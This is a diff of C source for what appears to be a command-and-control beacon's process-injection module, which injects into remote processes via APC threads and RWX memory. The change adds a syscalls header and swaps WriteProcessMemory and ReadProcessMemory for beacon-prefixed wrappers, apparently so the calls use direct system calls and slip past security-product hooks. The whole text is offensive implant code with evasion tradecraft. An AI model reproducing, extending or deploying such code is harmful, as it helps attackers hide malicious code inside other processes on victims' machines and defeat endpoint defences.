@@ -4,6 +4,7 @@
 #include <Tlhelp32.h>
 #include "beacon.h"
 #include "inject.h"
+#include "syscalls.h"
 #include <bcrypt.h>
 
 typedef NTSTATUS(NTAPI * NTQUEUEAPCTHREAD)(HANDLE hThreadHandle, LPVOID lpApcRoutine, LPVOID lpApcRoutineContext, LPVOID lpApcStatusBlock, LPVOID lpApcReserved);
@@ -66,7 +67,7 @@ static char * copycontext(HANDLE hProcess, DWORD pid, APCCONTEXT * context) {
 	ctx_remote = (char *)VirtualAllocEx(hProcess, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 	/* write our process memory */
-	if (ctx_remote != NULL && WriteProcessMemory(hProcess, ctx_remote, ctx_local, size, &wrote)) {
+	if (ctx_remote != NULL && beacon_WriteProcessMemory(hProcess, ctx_remote, ctx_local, size, &wrote)) {
 		if (wrote != size)
 			ctx_remote = NULL; /* TODO: should ctx_remote be released in the remote hProcess? VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE); */
 	}
@@ -141,13 +142,13 @@ BOOL inject_via_apcthread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID 
 	Sleep(200);
 
 	/* read the APC context to determine if we succeeded or failed */
-	if (!ReadProcessMemory(injctx->hProcess, remote_context, (char *)&ctx, sizeof(APCCONTEXT), &x) || x != sizeof(APCCONTEXT))
+	if (!beacon_ReadProcessMemory(injctx->hProcess, remote_context, (char *)&ctx, sizeof(APCCONTEXT), &x) || x != sizeof(APCCONTEXT))
 		return FALSE;
 
 	/* if we did not fire, make it so we don't accidentally kick off later */
 	if (ctx.fired == 0) {
 		ctx.fired = 1; /* update so that future wake-ups don't try anything */
-		WriteProcessMemory(injctx->hProcess, remote_context, (char *)&ctx, sizeof(APCCONTEXT), &x);
+		beacon_WriteProcessMemory(injctx->hProcess, remote_context, (char *)&ctx, sizeof(APCCONTEXT), &x);
 		return FALSE;
 	}
 
